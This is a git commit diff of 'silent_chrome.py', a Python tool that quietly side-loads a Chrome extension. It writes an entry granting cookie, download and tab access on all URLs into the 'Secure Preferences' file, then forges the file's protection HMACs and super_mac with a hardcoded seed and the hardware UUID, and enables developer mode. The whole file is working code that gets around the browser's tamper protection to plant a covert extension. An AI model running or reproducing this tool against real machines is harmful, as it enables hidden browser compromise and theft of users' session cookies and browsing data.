4c70ec59b333ca0396c8964d2e85b80f506cea94
sysophost <oxides-walkers.0x@icloud.com>
2025-06-02 15:17:40 +1000

    added cli args and tidied up output messages

--- silent_chrome.py
+++ silent_chrome.py
@@ -13,7 +13,7 @@ modification, are permitted provided that the following conditions are met:
 2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.
-   
+
 3. All advertising materials mentioning features or use of this software must display the following acknowledgement:
    This product includes software developed by AsaurusRex.
 
@@ -34,8 +34,8 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
 """
 
 
-import hmac 
-import json 
+import hmac
+import json
 from collections import OrderedDict
 import hashlib
 import subprocess
@@ -43,8 +43,11 @@ import re
 import datetime
 import os
 import sys
+import argparse
 
-#https://github.com/Pica4x6/SecurePreferencesFile 
+# https://github.com/Pica4x6/SecurePreferencesFile
+
+
 def removeEmpty(d):
     if type(d) == type(OrderedDict()):
         t = OrderedDict(d)
@@ -56,8 +59,8 @@ def removeEmpty(d):
                     removeEmpty(y)
                     if len(y) == 0:
                         del d[x]
-            elif(type(y) == type({})):
-                if(len(y) == 0):
+            elif (type(y) == type({})):
+                if (len(y) == 0):
                     del d[x]
                 else:
                     removeEmpty(y)
@@ -101,7 +104,9 @@ def removeEmpty(d):
                 if (not y) and (y not in [False, 0]):
                     del d[x]
 
-#https://github.com/Pica4x6/SecurePreferencesFile
+# https://github.com/Pica4x6/SecurePreferencesFile
+
+
 def calculateHMAC(value_as_string, path, sid, seed):
     if ((type(value_as_string) == type({})) or (type(value_as_string) == type(OrderedDict()))):
         removeEmpty(value_as_string)
@@ -111,7 +116,9 @@ def calculateHMAC(value_as_string, path, sid, seed):
 
     return hash_obj.hexdigest().upper()
 
-#https://github.com/Pica4x6/SecurePreferencesFile
+# https://github.com/Pica4x6/SecurePreferencesFile
+
+
 def calc_supermac(json_file, sid, seed):
     # Reads the file
     json_data = open(json_file, encoding="utf-8")
@@ -125,11 +132,13 @@ def calc_supermac(json_file, sid, seed):
     hash_obj = hmac.new(seed, super_msg.encode("utf-8"), hashlib.sha256)
     return hash_obj.hexdigest().upper()
 
+
 def encode_to_install_time(date):
     base_date = datetime.datetime(1970, 1, 1, 0, 0, 0)
     difference_in_seconds = (date - base_date).total_seconds()
     install_time = int(difference_in_seconds * 1000000) + 11644473600000000
     return install_time
+
 
 def calculate_chrome_dev_mac(seed: bytes, sid: str, pref_path: str, pref_value) -> str:
     """
@@ -146,33 +155,33 @@ def calculate_chrome_dev_mac(seed: bytes, sid: str, pref_path: str, pref_value) 
     """
     # Serialize the value to canonical JSON (compact, sorted if needed)
     serialized_value = json.dumps(pref_value, separators=(',', ':'), sort_keys=True)
-    
+
     # Build the input string
     hmac_input = (sid + pref_path + serialized_value).encode('utf-8')
-    
+
     # Calculate the HMAC-SHA256
     return hmac.new(seed, hmac_input, hashlib.sha256).hexdigest()
 
+
 def get_extension_id(path):
-    m=hashlib.sha256()
-    #m.update(bytes(path.encode('utf-16-le')))
+    m = hashlib.sha256()
+    # m.update(bytes(path.encode('utf-16-le')))
     m.update(bytes(path.encode('utf-8')))
     EXTID = ''.join([chr(int(i, base=16) + ord('a')) for i in m.hexdigest()][:32])
-    print("Using ExtID: {}".format(EXTID))
+    print(f"Using ExtID: {EXTID}")
     return EXTID
 
-def add_extension():
-    
-    extension_path = "/your/path/here"
-    #random_ext_str = "bafgiajifbmjkngngljdgmpcbehgbbkm" -> this is an example of how you could hard-code this if you need to.
-    random_ext_str = get_extension_id(extension_path) 
-    #print(random_ext_str)
+
+def add_extension(profile_path, extension_path):
+    # random_ext_str = "bafgiajifbmjkngngljdgmpcbehgbbkm" -> this is an example of how you could hard-code this if you need to.
+    random_ext_str = get_extension_id(extension_path)
+    # print(random_ext_str)
     sid = ""
     try:
         sid = subprocess.check_output(['system_profiler', 'SPHardwareDataType', '|', 'awk', '\'/UUID/ { print $3; }\''], universal_newlines=True)
         found = re.search('Hardware UUID: (.*)', sid)  # .group(1)
         sid = found.group(1)
-        #print(sid)
+        # print(sid)
     except:
         sid = subprocess.check_output(['blkid'], universal_newlines=True)
         sid = sid.split("\n")
@@ -180,51 +189,50 @@ def add_extension():
         found = re.findall(r' UUID=\"(.+?)\"', elem)  # .group(1)
         if found:
             sid = found[0]
-    
-    ###add json to file
+
+    # add json to file
     given_date = datetime.datetime.now()
     encoded_install_time = encode_to_install_time(given_date)
 
-    #extension_json = r'{"active_permissions":{"api":["contextMenus","history","storage","tabs","unlimitedStorage"],"explicit_host":[],"manifest_permissions":[],"scriptable_host":[]},"commands":{"_execute_action":{"was_assigned":true},"close":{"suggested_key":""},"manager":{"suggested_key":"Alt+A","was_assigned":true},"new":{"suggested_key":"Alt+N","was_assigned":true},"search":{"suggested_key":""},"switch":{"suggested_key":"Alt+S","was_assigned":true}},"content_settings":[],"creation_flags":9,"cws-info":{"is-live":true,"is-present":true,"last-updated-time-millis":"1721372400000","no-privacy-practice":false,"unpublished-long-ago":false,"violation-type":0},"filtered_service_worker_events":{"windows.onCreated":[{}],"windows.onFocusChanged":[{}],"windows.onRemoved":[{}]},"first_install_time":"%s","from_webstore":true,"granted_permissions":{"api":["contextMenus","history","storage","tabs","unlimitedStorage"],"explicit_host":[],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":1,"manifest":{"action":{"default_icon":{"32":"images/bookmark_btn.png"},"default_title":"Workona Spaces"},"background":{"service_worker":"background.js"},"commands":{"_execute_action":{"description":"Save current tab to space","suggested_key":{"default":"Alt+D","windows":"Alt+T"}},"close":{"description":"Close space"},"manager":{"description":"Switch space","suggested_key":{"default":"Alt+A"}},"new":{"description":"New space or doc","suggested_key":{"default":"Alt+N"}},"search":{"description":"Open Workona"},"switch":{"description":"Universal search","suggested_key":{"default":"Alt+S"}}},"description":"The world’s best tab manager","externally_connectable":{"matches":["https://workona.com/*","https://*.workona.com/*"]},"homepage_url":"https://workona.com/0/","icons":{"128":"images/icon_128.png","16":"images/icon_16.png","256":"images/icon_256.png","32":"images/icon_32.png","48":"images/icon_96.png","96":"images/icon_96.png"},"key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlTDCGRkVU6zgrNCQQMXwgoVB0A+rGZh9E1yokH4T+cqz6zxMG/f/gZiWHvYDb9thNTtGKyl7LiE0Op3VTqeRlSV8pN5+5ojkSawiNHEXS+8ImzAoSsWTFkiloZnk6HIP2eCKvx2be+mE74Yq/6kPnTxApUitZ6gXVM1udnw59mFhXw8R9DUtMDTfQwA1Us8UnfBIEyqIfcqVqdymYjZfD9e16n7kVzq4p0yHnXgyrIUhRsI2APfsgVD673R7sDtbJDeU5lvuZBvBjczKw16YL2RqdlzmVZXaIZClsWWMEoyH9Q2mLZf9tM5aaSoiguMQ3VVlDRMzlzm5xtjFmLfINwIDAQAB","manifest_version":3,"minimum_chrome_version":"102","name":"Tab Manager by Workona","optional_host_permissions":["https://workona.com/*","https://*.workona.com/*"],"optional_permissions":["system.memory","tabGroups"],"permissions":["contextMenus","history","tabs","storage","unlimitedStorage"],"short_name":"Workona","update_url":"https://clients2.google.com/service/update2/crx","version":"3.1.32"},"needs_sync":true,"path":"ailcmbgekjpnablpdkmaaccecekgdhlh/3.1.32_0","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"3.1.32"},"serviceworkerevents":["commands.onCommand","contextMenus.onClicked","runtime.onConnectExternal","runtime.onInstalled","runtime.onStartup","runtime.onSuspend","runtime.onSuspendCanceled","runtime.onUpdateAvailable","tabs.onActivated","tabs.onAttached","tabs.onCreated","tabs.onDetached","tabs.onMoved","tabs.onRemoved","tabs.onReplaced","tabs.onUpdated"],"state":1,"uninstall_url":"https://workona.com/extension-feedback/","was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (encoded_install_time, encoded_install_time)
+    # extension_json = r'{"active_permissions":{"api":["contextMenus","history","storage","tabs","unlimitedStorage"],"explicit_host":[],"manifest_permissions":[],"scriptable_host":[]},"commands":{"_execute_action":{"was_assigned":true},"close":{"suggested_key":""},"manager":{"suggested_key":"Alt+A","was_assigned":true},"new":{"suggested_key":"Alt+N","was_assigned":true},"search":{"suggested_key":""},"switch":{"suggested_key":"Alt+S","was_assigned":true}},"content_settings":[],"creation_flags":9,"cws-info":{"is-live":true,"is-present":true,"last-updated-time-millis":"1721372400000","no-privacy-practice":false,"unpublished-long-ago":false,"violation-type":0},"filtered_service_worker_events":{"windows.onCreated":[{}],"windows.onFocusChanged":[{}],"windows.onRemoved":[{}]},"first_install_time":"%s","from_webstore":true,"granted_permissions":{"api":["contextMenus","history","storage","tabs","unlimitedStorage"],"explicit_host":[],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":1,"manifest":{"action":{"default_icon":{"32":"images/bookmark_btn.png"},"default_title":"Workona Spaces"},"background":{"service_worker":"background.js"},"commands":{"_execute_action":{"description":"Save current tab to space","suggested_key":{"default":"Alt+D","windows":"Alt+T"}},"close":{"description":"Close space"},"manager":{"description":"Switch space","suggested_key":{"default":"Alt+A"}},"new":{"description":"New space or doc","suggested_key":{"default":"Alt+N"}},"search":{"description":"Open Workona"},"switch":{"description":"Universal search","suggested_key":{"default":"Alt+S"}}},"description":"The world’s best tab manager","externally_connectable":{"matches":["https://workona.com/*","https://*.workona.com/*"]},"homepage_url":"https://workona.com/0/","icons":{"128":"images/icon_128.png","16":"images/icon_16.png","256":"images/icon_256.png","32":"images/icon_32.png","48":"images/icon_96.png","96":"images/icon_96.png"},"key":"MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlTDCGRkVU6zgrNCQQMXwgoVB0A+rGZh9E1yokH4T+cqz6zxMG/f/gZiWHvYDb9thNTtGKyl7LiE0Op3VTqeRlSV8pN5+5ojkSawiNHEXS+8ImzAoSsWTFkiloZnk6HIP2eCKvx2be+mE74Yq/6kPnTxApUitZ6gXVM1udnw59mFhXw8R9DUtMDTfQwA1Us8UnfBIEyqIfcqVqdymYjZfD9e16n7kVzq4p0yHnXgyrIUhRsI2APfsgVD673R7sDtbJDeU5lvuZBvBjczKw16YL2RqdlzmVZXaIZClsWWMEoyH9Q2mLZf9tM5aaSoiguMQ3VVlDRMzlzm5xtjFmLfINwIDAQAB","manifest_version":3,"minimum_chrome_version":"102","name":"Tab Manager by Workona","optional_host_permissions":["https://workona.com/*","https://*.workona.com/*"],"optional_permissions":["system.memory","tabGroups"],"permissions":["contextMenus","history","tabs","storage","unlimitedStorage"],"short_name":"Workona","update_url":"https://clients2.google.com/service/update2/crx","version":"3.1.32"},"needs_sync":true,"path":"ailcmbgekjpnablpdkmaaccecekgdhlh/3.1.32_0","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"3.1.32"},"serviceworkerevents":["commands.onCommand","contextMenus.onClicked","runtime.onConnectExternal","runtime.onInstalled","runtime.onStartup","runtime.onSuspend","runtime.onSuspendCanceled","runtime.onUpdateAvailable","tabs.onActivated","tabs.onAttached","tabs.onCreated","tabs.onDetached","tabs.onMoved","tabs.onRemoved","tabs.onReplaced","tabs.onUpdated"],"state":1,"uninstall_url":"https://workona.com/extension-feedback/","was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (encoded_install_time, encoded_install_time)
 
-    print(encoded_install_time)
-    extension_json=r'{"account_extension_type":0,"active_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"disable_reasons":[],"first_install_time":"%s","from_webstore":false,"granted_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":4,"newAllowFileAccess":true,"path":"%s","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (encoded_install_time, encoded_install_time, extension_path)
-    
+    print(f"Install Time: {encoded_install_time}")
+    extension_json = r'{"account_extension_type":0,"active_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"disable_reasons":[],"first_install_time":"%s","from_webstore":false,"granted_permissions":{"api":["cookies","downloads","storage","tabs"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"%s","location":4,"newAllowFileAccess":true,"path":"%s","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"1.0"},"serviceworkerevents":["tabs.onUpdated"],"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}' % (
+        encoded_install_time, encoded_install_time, extension_path)
 
-    dict_extension=json.loads(extension_json, object_pairs_hook=OrderedDict)
-    username = os.getlogin()
-    filepath = "/Users/{}/Library/Application Support/Google/Chrome/Default/Secure Preferences".format(username)
-   
+    dict_extension = json.loads(extension_json, object_pairs_hook=OrderedDict)
+    filepath = f"{profile_path}/Secure Preferences"
+    print(f"Modifying Secure Preferences in: {filepath}")
+
     with open(filepath, 'rb') as f:
         data = f.read()
         f.close()
-    data=json.loads(data,object_pairs_hook=OrderedDict)
-    
-    data["extensions"]["settings"][random_ext_str] = dict_extension
-   
-    ###calculate hash for [protect][mac]
-    path="extensions.settings.{}.".format(random_ext_str)
-    #hardcoded seed
-    seed=b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
-    
-    macs = calculateHMAC(dict_extension, path[:-1], sid, seed)
-    print(macs)
-    #add macs to json file
-    data["protection"]["macs"]["extensions"]["settings"][random_ext_str]=macs
+    data = json.loads(data, object_pairs_hook=OrderedDict)
 
-    #set dev mode to true
+    data["extensions"]["settings"][random_ext_str] = dict_extension
+
+    # calculate hash for [protect][mac]
+    path = f"extensions.settings.{random_ext_str}."
+    # hardcoded seed
+    seed = b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'
+
+    macs = calculateHMAC(dict_extension, path[:-1], sid, seed)
+    print(f"Extension HMAC: {macs}")
+    # add macs to json file
+    data["protection"]["macs"]["extensions"]["settings"][random_ext_str] = macs
+
+    # set dev mode to true
     try:
-        data["extensions"]["ui"]["developer_mode"]=True
-    except KeyError: # means extensions: UI is not found
-       
+        data["extensions"]["ui"]["developer_mode"] = True
+    except KeyError:  # means extensions: UI is not found
+
         # developer_mode = OrderedDict()
         # ui = OrderedDict()
-        
 
         data["extensions"].setdefault("ui", OrderedDict())
         # now insert your empty OrderedDict into developer_mode
         data["extensions"]["ui"]["developer_mode"] = OrderedDict()
-        data["extensions"]["ui"]["developer_mode"]= True
+        data["extensions"]["ui"]["developer_mode"] = True
 
         # print("Need to toggle developer mode")
         # sys.exit()
@@ -232,30 +240,37 @@ def add_extension():
     pref_path = "extensions.ui.developer_mode"
     pref_value = True
     mac = calculate_chrome_dev_mac(seed, sid, pref_path, pref_value)
-    print(mac)
+    print(f"Dev Mode HMAC: {macs}")
     try:
-        data["protection"]["macs"]["extensions"]["ui"]["developer_mode"]=mac
+        data["protection"]["macs"]["extensions"]["ui"]["developer_mode"] = mac
     except KeyError:
         print("Need to toggle developer mode")
         sys.exit()
-    devmode_value=r'{"developer_mode": true}'
-    parseddevmode=json.loads(devmode_value, object_pairs_hook=OrderedDict)
-    
-    newdata=json.dumps(data)
-    
+    devmode_value = r'{"developer_mode": true}'
+    parseddevmode = json.loads(devmode_value, object_pairs_hook=OrderedDict)
+
+    newdata = json.dumps(data)
+
     with open(filepath, 'w') as z:
-            z.write(newdata)
+        z.write(newdata)
     z.close()
-    ###recalculate and replace super_mac
-    print("=======================================================================================================================================================================================================================\n")
-    supermac=calc_supermac(filepath,sid,seed)
-    print(supermac)
-    data["protection"]["super_mac"]=supermac
-    newdata=json.dumps(data)
-    #print(newdata)
+    # recalculate and replace super_mac
+    print("=" * 80)
+    supermac = calc_supermac(filepath, sid, seed)
+    print(f"Super Mac: {supermac}")
+    data["protection"]["super_mac"] = supermac
+    newdata = json.dumps(data)
+    # print(newdata)
     with open(filepath, 'w') as z:
-            z.write(newdata)
+        z.write(newdata)
     z.close()
 
+
 if __name__ == "__main__":
-    add_extension()
+    parser = argparse.ArgumentParser(description="Add a Chrome extension by modifying Secure Preferences.")
+    parser.add_argument("--profile_path", "-p", default=os.path.expanduser("~/Library/Application Support/Google/Chrome/Default"),
+                        help="Path to the Chrome extension to install")
+    parser.add_argument("--extension_path", "-e", required=True, help="Path to the Chrome extension to install")
+
+    args = parser.parse_args()
+    add_extension(args.profile_path, args.extension_path)
